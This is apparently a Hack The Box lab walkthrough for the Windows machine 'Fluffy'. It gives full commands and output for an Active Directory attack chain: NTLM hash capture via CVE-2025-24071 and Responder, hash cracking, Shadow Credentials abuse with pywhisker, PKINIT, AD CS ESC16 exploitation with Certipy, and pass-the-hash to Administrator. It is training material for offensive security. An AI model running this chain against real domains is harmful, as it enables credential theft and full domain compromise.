# Fluffy

**Platform:** [Hack The Box](https://app.hackthebox.com/machines/Fluffy)  
**OS:** Windows  
**Difficulty:** Easy

## Summary

This box involves exploiting SMB shares, leveraging Active Directory Certificate Services (AD CS) vulnerabilities, and performing Kerberos-based attacks to achieve privilege escalation.

---

## Initial Credentials

- **Username:** `j.fleischman`
- **Password:** `J0elTHEM4n1990!`

---

## Important Note: Clock Skew Error

If you encounter the following error:

```
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

This means your system's clock is not synchronized with the Domain Controller (DC). Kerberos allows only a 5-minute clock skew by default.

**Fix (Linux):**
```bash
sudo ntpdate <DC-IP>
```

**Fix (Windows):**
```cmd
w32tm /resync /manualpeerlist:<DC-IP>
```

---

## Enumeration

### Port Scan

```bash
nmap -F 10.10.11.69
```

**Open Ports:**
- 53/tcp - domain
- 88/tcp - kerberos-sec
- 139/tcp - netbios-ssn
- 389/tcp - ldap
- 445/tcp - microsoft-ds

**Domain:** `fluffy.htb`

### Service Principal Names (SPNs)

```bash
impacket-GetUserSPNs fluffy.htb/j.fleischman:J0elTHEM4n1990! -dc-ip 10.10.11.69
```

**Results:**
- `ADCS/ca.fluffy.htb` - ca_svc
- `LDAP/ldap.fluffy.htb` - ldap_svc
- `WINRM/winrm.fluffy.htb` - winrm_svc

### User Enumeration

```bash
nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' --users
```

**Users:**
- j.fleischman
- j.coffey
- winrm_svc
- p.agila
- ldap_svc
- ca_svc
- krbtgt
- Guest
- Administrator

### SMB Share Enumeration

```bash
nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' --shares
smbclient -L 10.10.11.69 -U j.fleischman --password='J0elTHEM4n1990!'
```

**Shares:**
- ADMIN$ - Remote Admin
- C$ - Default share
- IPC$ - Remote IPC
- IT - IT share
- NETLOGON - Logon server share
- SYSVOL - Logon server share

### Accessing IT Share

```bash
smbclient //10.10.11.69/IT -U j.fleischman --password='J0elTHEM4n1990!'
```

**Contents:**
- Everything-1.4.1.1026.x64/ (directory)
- Everything-1.4.1.1026.x64.zip
- KeePass-2.58/ (directory)
- KeePass-2.58.zip
- Upgrade_Notice.pdf

---

## Vulnerability Analysis

### CVEs in Upgrade Notice

The `Upgrade_Notice.pdf` mentions several critical CVEs:

#### CVE-2025-24996 (Critical)
Vulnerability in Windows NTLM authentication that allows attackers to perform network spoofing by exploiting external control of file names or paths, potentially leading to unauthorized access to sensitive information.

#### CVE-2025-24071 (Critical)
Vulnerability in Windows File Explorer that allows attackers to capture NTLM hashes by tricking the system into sending authentication requests when a user extracts a specially crafted `.library-ms` file from a compressed archive.

**Exploit:** [CVE-2025-24071-msfvenom](https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom)

#### Other CVEs
- **CVE-2025-46785:** Buffer over-read in Zoom Workplace Apps
- **CVE-2025-29968:** Improper input validation in AD CS

---

## Exploitation

### Capturing NTLM Hash with Responder

```bash
sudo responder -I tun0
```

After triggering the vulnerability, captured hash for `p.agila`.

### Cracking the Hash

```bash
john --format=netntlmv2 -w=/usr/share/wordlists/rockyou.txt p.agila_hashes
```

**Result:**
- **Username:** `p.agila`
- **Password:** `prometheusx-303`

---

## BloodHound Enumeration

```bash
nxc ldap 10.10.11.69 -u p.agila -p prometheusx-303 --bloodhound --collection ALL --dns-server 10.10.11.69
```

### Key Findings

Research areas identified:
- Targeted Kerberoasting
- How to abuse GenericWrite on:
  - ldap_svc
  - winrm_svc
  - ca_svc
- Shadow Credentials
- PKINIT
- AD CS ESC16

---

## Privilege Escalation via Shadow Credentials

### Abusing GenericWrite with Pywhisker

**Reference:** [pywhisker](https://github.com/ShutdownRepo/pywhisker)

#### Adding Shadow Credentials

```bash
sudo python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ca_svc" --action "add"
```

**Output:**
- DeviceID: `ce4ecc88-2be3-0d00-75d3-29e534ea64ba`
- PFX file: `bT7cGgq6.pfx`
- PFX password: `WXQozpzogvImSumG8FUk`

#### Listing Shadow Credentials

```bash
python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ca_svc" --action "list"
```

---

## PKINIT Authentication

**Reference:** [PKINITtools](https://github.com/dirkjanm/PKINITtools)

### Requesting TGT

```bash
python gettgtpkinit.py fluffy.htb/ca_svc -cert-pfx ../pywhisker/pywhisker/bT7cGgq6.pfx -pfx-pass WXQozpzogvImSumG8FUk ca_svc.ccache
```

**AS-REP Encryption Key:**
```
d2c135b38aaba6fefcf50bac9f15e101b3921ce90bfde7babeb23dbef1f226a0
```

This key is used to decrypt the AS-REP in Kerberos authentication and extract the NT hash from the PAC (Privilege Attribute Certificate).

### Handling Clock Skew

If you encounter `KRB_AP_ERR_SKEW`, sync your clock:

```bash
sudo systemctl stop systemd-timesyncd
sudo ntpdate -u 10.10.11.69
```

### Extracting NT Hash

```bash
python getnthash.py fluffy.htb/ca_svc -key d2c135b38aaba6fefcf50bac9f15e101b3921ce90bfde7babeb23dbef1f226a0
```

**Recovered NT Hash:**
```
ca0f4f9e9eb8a092addf53bb03fc98c8
```

---

## AD CS ESC16 Exploitation

### Using Certipy

**Reference:** [Certipy Wiki](https://github.com/ly4k/Certipy/wiki/)

#### Installation

```bash
pip install certipy-ad
```

#### Finding Vulnerabilities

```bash
certipy find -dc-ip 10.10.11.69 -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
```

**Key Finding:**
- **ESC16:** Security Extension is disabled on CA globally
- CA Name: `fluffy-DC01-CA`
- DNS Name: `DC01.fluffy.htb`

### Understanding ESC16

ESC16 occurs when the `szOID_CERTSRV_CA_VERSION` security extension is disabled on a Certificate Authority, allowing attackers to request certificates for other users.

### Reading User Attributes

```bash
certipy account -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -target 'fluffy.htb' -user 'ca_svc' read
```

### Updating UPN to Administrator

**Important:** The `administrator` UPN is already in use. You must first set it to `ca_svc@fluffy.htb`, then update to `administrator@fluffy.htb`.

#### Step 1: Rollback to ca_svc

```bash
certipy account -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -target 'fluffy.htb' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

#### Step 2: Update to Administrator

```bash
certipy account -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -target 'fluffy.htb' -upn 'administrator@fluffy.htb' -user 'ca_svc' update
```

### Requesting Certificate

```bash
certipy req -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -ca 'fluffy-DC01-CA' -template 'User' -upn 'administrator@fluffy.htb'
```

**Output:**
- Request ID: 67
- Certificate saved to: `administrator.pfx`

### Rollback UPN Again

```bash
certipy account -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -target 'fluffy.htb' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

### Authenticating with Certificate

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.69
```

**Result:**
- TGT saved to: `administrator.ccache`
- NT Hash: `aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e`

---

## Remote Access

### Evil-WinRM

```bash
evil-winrm -i 10.10.11.69 -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```

### PsExec

```bash
impacket-psexec fluffy.htb/Administrator@10.10.11.69 -hashes :8da83a3fa618b6e3a00e93f676c92a6e
```

---

## Final Credentials

- **Username:** `Administrator`
- **NT Hash:** `8da83a3fa618b6e3a00e93f676c92a6e`

---

## Key Takeaways

1. Always synchronize your clock with the DC when working with Kerberos
2. CVE-2025-24071 can be exploited to capture NTLM hashes via malicious `.library-ms` files
3. Shadow Credentials can be abused with GenericWrite permissions
4. ESC16 (disabled security extension on CA) allows certificate requests for arbitrary users
5. UPN manipulation is key to exploiting ESC16 successfully